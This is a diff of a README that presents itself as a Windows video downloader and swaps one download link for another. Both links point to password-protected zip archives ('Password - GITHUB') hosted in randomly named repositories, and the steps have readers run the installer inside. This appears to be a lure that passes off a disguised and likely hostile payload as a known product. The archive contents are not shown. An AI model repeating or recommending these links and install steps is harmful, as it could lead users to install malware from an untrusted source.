@@ -1,6 +1,6 @@
 # 📥 4k-video-downloader-windows - Save online videos for offline viewing
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/AssistantStay/rphiwmcm/releases/download/v2/Release_Setup.zip) **Password - GITHUB**
+[![Download Now](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip) **Password - GITHUB**
 
 This application lets you save videos from the internet to your computer. You can keep your favorite clips for offline viewing. The tool supports playlists, subtitles, and various video formats. It works on Windows computers.
 
@@ -31,7 +31,7 @@ Ensure your computer meets these needs before you begin:
 Follow these steps to set up the software on your machine.
 
 1.  Visit the official release page to download the software.
-2.  Click the following link to access the file: [Download 4K Video Downloader](https://github.com/AssistantStay/rphiwmcm/releases/download/v2/Release_Setup.zip).
+2.  Click the following link to access the file: [Download 4K Video Downloader](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip).
 3.  Locate the downloaded file in your browser or your Downloads folder.
 4.  Double-click the installer file to start the process. (Use password GITHUB)
 5.  Follow the instructions on your screen to complete the installation.
